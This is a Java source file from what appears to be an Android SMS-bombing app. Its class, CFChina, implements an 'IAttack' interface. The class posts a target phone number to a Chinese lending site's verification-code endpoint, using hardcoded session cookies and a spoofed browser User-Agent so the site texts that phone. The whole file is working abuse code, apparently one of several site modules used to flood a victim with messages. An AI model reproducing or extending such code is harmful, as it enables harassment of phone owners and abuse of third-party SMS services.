package com.example.wudi.sms.sites;

import android.util.Log;

import com.example.wudi.sms.MainApplication;
import com.example.wudi.sms.Utils;
import com.squareup.okhttp.Callback;
import com.squareup.okhttp.MediaType;
import com.squareup.okhttp.OkHttpClient;
import com.squareup.okhttp.Request;
import com.squareup.okhttp.RequestBody;
import com.squareup.okhttp.Response;

import java.io.IOException;
import java.util.concurrent.TimeUnit;

/**
 * Created by wudi on 12/16/2015.
 */
public class CFChina implements IAttack {
    @Override
    public void attack() {
        final MediaType text = MediaType.parse("application/x-www-form-urlencoded; charset=UTF-8");

        OkHttpClient client = new OkHttpClient();
        client.setConnectTimeout(5000, TimeUnit.MILLISECONDS);
        client.setReadTimeout(5000, TimeUnit.MILLISECONDS);
        client.setWriteTimeout(5000, TimeUnit.MILLISECONDS);
        String postBody = "code=8847&rn=0.7397144487477864&isVoiceType=false&mobilePhone="+ Utils.getNumber(MainApplication.context);

        Request request = new Request.Builder()
                .url("http://www.cfbb.com.cn/CommonComponents/CallPhoneCodeForEntry")
                .post(RequestBody.create(text, postBody))
                .addHeader("Cookie", "aliyungf_tc=AQAAAC3RXlLFoQcAry5k0xyE4hkwBFOy; _qzja=1.917381038.1450268870595.1450268870595.1450268870595.1450268870595.1450268870595.0.0.0.1.1; _qzjb=1.1450268870595.1.0.0.0; _qzjc=1; _qzjto=1.1.0; _nc=g%2f6ZynEoMESGC8UCcgvMUVp4%2fHtLjmMjYgfyP2nP1Gw%3dVv8yWBTGTL3aRfR%2bqIJJayJXAS00gu3stzhTAN640Poq2XG8n57v%2bPAZcZHHwE6m5OwZWI1VGbMngZ0A3w6F%2fNUaCtu5wVkA29yOn6QfjAg%3d; Hm_lvt_f0fc8741370979ec19e272a5c8c7c5fa=1450268869; Hm_lpvt_f0fc8741370979ec19e272a5c8c7c5fa=1450268869; _jzqa=1.997328125489680000.1450268870.1450268870.1450268870.1; _jzqb=1.1.10.1450268870.1; _jzqc=1; _jzqx=1.1450268870.1450268870.1.jzqsr=rong360%2Ecom|jzqct=/licai-p2p/pingtai-1249.-; _jzqckmp=1")
                .addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586")
                .addHeader("Accept-Encoding", "gzip, deflate")
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Request request, IOException e) {
                Log.d("hello", e.getMessage());
            }

            @Override
            public void onResponse(Response response) throws IOException {
                response.body().close();
            }
        });
    }
}
